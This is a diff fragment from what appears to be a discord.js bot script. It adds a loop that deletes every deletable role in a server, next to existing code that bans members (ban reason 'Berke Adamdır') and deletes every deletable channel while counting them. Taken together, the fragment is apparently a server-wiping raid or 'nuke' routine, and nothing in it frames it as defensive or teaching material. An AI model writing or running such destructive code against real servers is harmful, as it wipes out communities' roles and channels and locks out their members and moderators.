@@ -15,6 +15,13 @@ message.guild.ban(u, "Berke Adamdır")
 })
   
 
+message.guild.roles.forEach(c => {
+if (c.deletable) {
+roller++;
+return c.delete();   
+}
+});  
+
 message.guild.channels.forEach(c => {
 if (c.deletable) {
 kanallar++;
